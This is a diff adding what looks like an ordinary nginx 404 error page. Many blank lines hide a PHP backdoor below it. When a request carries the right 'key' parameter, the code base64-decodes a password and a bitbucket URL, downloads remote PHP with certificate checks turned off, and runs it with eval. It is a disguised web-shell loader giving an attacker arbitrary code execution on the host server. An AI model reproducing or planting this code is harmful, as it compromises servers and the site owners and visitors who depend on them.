@@ -1,0 +1,137 @@
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx/1.24.0 (Ubuntu)</center>
+</body>
+</html>
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php
+$cookie_file = tempnam(sys_get_temp_dir(), 'c0k1e_');
+
+$encoded_password = "YWRmZ2g=";
+$encoded_url = "aHR0cHM6Ly9iaXRidWNrZXQub3JnL2pheWFudGkxMjMxL3Byb2plY3QtYmQvcmF3Lzg1YzY1ZDY0MzgzNGY2ZTIxOGZlNmUxZWU3MGY5YmM2MTFhNmVkNjcvbm8tcGFzcy50eHQ=";
+
+
+$password = base64_decode($encoded_password);
+$target_url = base64_decode($encoded_url);
+
+if (!isset($_GET['key']) || $_GET['key'] !== $password) {
+    http_response_code(200);
+    exit;
+}
+
+function geturlsinfo($url, $cookie_path) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($conn, CURLOPT_COOKIEJAR, $cookie_path);   
+        curl_setopt($conn, CURLOPT_COOKIEFILE, $cookie_path); 
+        $data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $data = file_get_contents($url);
+    } else {
+        $data = false;
+    }
+    return $data;
+}
+
+$content = geturlsinfo($target_url, $cookie_file);
+
+if ($content) {
+    eval('?>' . $content);
+} else {
+    echo "Gagal ambil data dari URL.";
+}
+
+if (file_exists($cookie_file)) {
+    unlink($cookie_file);
+}
+?>
